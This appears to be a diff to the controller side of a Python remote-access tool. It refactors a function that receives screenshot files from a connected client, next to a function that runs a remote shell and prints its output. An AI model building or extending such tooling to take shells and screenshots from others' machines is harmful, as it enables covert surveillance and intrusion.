@@ -39,29 +39,23 @@ def open_shell():
         output = conn_to_client.recv(1024)
         print(output.decode())
 
-def download_file(file_path, file_name): 
-    file_server, address = server.accept()
-    
-    if not file_server:
-        print("Could not establish connection with file server")
-        return
-    
-    file_size = int(file_server.recv(8).decode())
-    
+
+# Set blocking
+def download_file():
+    file_size = int(conn_to_client.recv(8).decode())
+
     c = 0
-    file = open(f"{file_path}{time.asctime(time.localtime(time.time()))}.png", "wb")
-    while c <= file_size:
-        file_buff = file_server.recv(1024)
-        
+    file = open(f"screen_shot_{time.asctime(time.localtime(time.time()))}.png", "wb")
+    while c < file_size:
+        file_buff = conn_to_client.recv(4096)
         if not file_buff:
             break
-        
+
         file.write(file_buff)
         c += len(file_buff)
 
-    file_server.shutdown(socket.SHUT_WR)
-    file_server.close()
     file.close()
+
 
 def main():
     establish_connection()
